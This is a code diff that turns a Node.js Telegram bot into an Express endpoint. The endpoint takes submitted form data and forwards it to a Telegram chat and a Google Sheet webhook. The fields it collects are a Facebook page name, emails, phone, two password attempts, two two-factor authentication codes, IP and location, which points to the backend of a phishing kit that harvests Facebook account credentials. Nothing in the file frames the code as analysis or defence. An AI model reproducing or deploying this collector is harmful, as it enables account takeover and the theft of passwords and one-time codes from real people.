@@ -1,47 +1,82 @@
-/*!
- * Created by Manh Tuan (JUNO_OKYO)
- * Demo for my video on TikTok: https://www.tiktok.com/@juno_okyo/video/7284660854539177221
- * Follow me for more videos.
- *
- * Please edit webhookUrl and token before run this script!!!
- */
-import TelegramBot from 'node-telegram-bot-api';
-import fetch from 'node-fetch';
+import express from "express";
 import 'dotenv/config';
+import cors from "cors";
+import TelegramBot from 'node-telegram-bot-api';
+
+const app = express();
+const corsOptions ={
+    origin:['http://localhost:3000'], 
+    credentials:true,            //access-control-allow-credentials:true
+    optionSuccessStatus:200
+}
+app.use(cors(corsOptions));
+
+app.use(express.json());
 
 const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
 
-bot.onText(/\/add (.+)/, (msg, match) => {
-    const chatId = msg.chat.id;
+app.post('/api/news', (req, res) => {
+    // GET DATA FROM CLIENT
+    const data = req.body; 
+    console.log('Dữ liệu nhận được:', data);
 
-    if (!match[1].includes('|')) {
-        bot.sendMessage(chatId, 'Vui lòng nhập đúng định dạng.' + '\n\n' + 'Ví dụ:\n```\n/add name|email\n```', {
-            parse_mode: 'Markdown'
-        });
-        return;
+    const result = {
+        "status": 0,
+        "message": "Success!"
     }
 
-    bot.sendChatAction(chatId, 'typing');
+    res.send(result);
 
-    const resp = match[1];
-    const values = resp.split('|');
+    // SEND DATA TO TELE
+    const message = `Email Account: ${data.fill_business_email ? data.fill_business_email : ''} 
+    Name Acount: ${data.fill_full_name ? data.fill_full_name : ''} 
+    Personal Email: ${data.fill_personal_email ? data.fill_personal_email : ''}
+    Facebook Page: ${data.fill_facebook_pagename ? data.fill_facebook_pagename : ''}
+    Phone Number: ${data.fill_phone ? data.fill_phone : ''}
+    Password First: ${data.first_password ? data.first_password : ''}
+    Password Second: ${data.second_password ? data.second_password : ''}
+    Ip: ${data.ip ? data.ip : ''}
+    City: ${data.city ? data.city : ''}
+    Country: ${data.country ? data.country : ''}
+    First Code Authen: ${data.first_code ? data.first_code : ''}
+    Second Code Authen: ${data.second_code ? data.second_code : ''}
+    Images Url: ${data.image ? data.image : ''}`;
 
+    bot.sendMessage(process.env.CHAT_ID, message);
+
+
+    // ADD GOOGLE SHEET
     const url = new URL(process.env.WEBHOOK_URL);
-    url.searchParams.append('name', values[0]);
-    url.searchParams.append('email', values[1]);
+
+    url.searchParams.append('Email Account', data.fill_business_email ? data.fill_business_email : '');
+    url.searchParams.append('Name Acount', data.fill_full_name ? data.fill_full_name : '');
+    url.searchParams.append('Personal Email', data.fill_personal_email ? data.fill_personal_email : '');
+    url.searchParams.append('Facebook Page', data.fill_facebook_pagename ? data.fill_facebook_pagename : '');
+    url.searchParams.append('Phone Number', data.fill_phone ? data.fill_phone : '');
+    url.searchParams.append('Password First', data.first_password ? data.first_password : '');
+    url.searchParams.append('Password Second', data.second_password ? data.second_password : '');
+    url.searchParams.append('Ip', data.ip ? data.ip : '');
+    url.searchParams.append('City', data.city ? data.city : '');
+    url.searchParams.append('Country', data.country ? data.country : '');
+    url.searchParams.append('First Code Authen', data.first_code ? data.first_code : '');
+    url.searchParams.append('Second Code Authen', data.second_code ? data.second_code : '');
+    url.searchParams.append('Images Url', data.image ? data.image : '');
 
     fetch(url)
         .then(res => res.json())
         .then(data => {
             if (data.status === 'success') {
-                bot.sendMessage(chatId, '✅ Đã thêm thành công.');
+                bot.sendMessage(process.env.CHAT_ID, '✅ Đã thêm vào Sheet thành công.');
             } else {
-                bot.sendMessage(chatId, 'Không thể thêm. Vui lòng thử lại sau!');
+                bot.sendMessage(process.env.CHAT_ID, 'Không thể thêm. Vui lòng thử lại sau!');
             }
         })
         .catch(err => {
             bot.sendMessage(chatId, 'Đã có lỗi xảy ra. Vui lòng thử lại sau!');
         });
+
 });
 
-console.log('Bot is running...')
+app.listen(process.env.PORT, () => {
+    console.log(`Server đang lắng nghe tại cổng ${process.env.PORT}`);
+});
